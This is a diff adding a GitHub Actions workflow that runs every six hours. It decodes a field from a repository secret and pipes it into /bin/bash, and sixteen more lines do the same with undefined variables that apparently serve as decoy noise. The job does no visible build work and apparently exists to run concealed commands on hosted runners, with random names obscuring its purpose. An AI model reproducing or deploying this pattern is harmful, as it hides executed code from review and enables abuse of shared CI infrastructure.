@@ -1,0 +1,32 @@
+name: chaifangkaiwk
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chaifangkaiwk
+        env:
+          xczo0: ${{ secrets.xczo0 }}
+        run: |
+          echo $xczo0 | jq -r .f70655 | /bin/bash
+          echo $y93 | jq -r .z4 | /bin/bash
+          echo $r11790 | jq -r .qood67 | /bin/bash
+          echo $up245 | jq -r .rlawt994 | /bin/bash
+          echo $c177 | jq -r .n1853 | /bin/bash
+          echo $z77325 | jq -r .g77588 | /bin/bash
+          echo $ff84482 | jq -r .knr8788 | /bin/bash
+          echo $a48285 | jq -r .b9776 | /bin/bash
+          echo $scoi78 | jq -r .owdsy40346 | /bin/bash
+          echo $dzi3 | jq -r .x852 | /bin/bash
+          echo $ht2 | jq -r .ful4059 | /bin/bash
+          echo $ozxot0 | jq -r .klqjk3 | /bin/bash
+          echo $oz466 | jq -r .lexhd3 | /bin/bash
+          echo $vpmjo243 | jq -r .rsmbn63327 | /bin/bash
+          echo $pylh89422 | jq -r .lv11033 | /bin/bash
+          echo $lhtd11 | jq -r .mg858 | /bin/bash
+          echo $o080 | jq -r .ulh146 | /bin/bash
+
